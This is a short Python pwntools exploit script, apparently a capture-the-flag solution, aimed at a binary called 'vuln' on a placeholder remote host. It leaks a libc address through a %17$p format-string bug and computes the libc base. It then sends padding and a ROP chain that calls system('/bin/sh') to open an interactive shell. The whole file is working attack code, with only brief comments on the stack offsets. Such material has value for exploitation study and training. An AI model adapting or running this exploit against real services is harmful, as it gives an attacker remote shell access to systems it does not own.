from pwn import*

exe = context.binary = ELF("./vuln", checksec=False)
libc = context.binary = ELF("./libc.so.6", checksec=False)

arg_num = 17
leak_offset = 0x2724a

p = remote("host", "port")


# Leak the libc address on the stack using format string vuln
p.sendline(f"%{arg_num}$p".encode()) # %17$p  (6th arg is rsp and after 11, 8 byte values from the rsp the libc leak is present on the stack (6 + 11 = 17))

p.recvuntil("giving you ")

leak = p.recvline().strip(b'\n')
leak = int(leak, 16)

# Calculating libc base using the leak and the offset we found using gdb
libc.address = leak - leak_offset
log.info(f"libc at: {hex(libc.address)}")


# Finding rop gadgets after updating the libc base
rop_ = ROP(libc)

pop_rdi = rop_.rdi.address
ret = rop_.ret.address
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

# Preparing the payload
payload = flat(
    asm("nop") * 40,
    pop_rdi,
    binsh,
    ret,
    system
)

p.sendline(payload)

p.interactive()
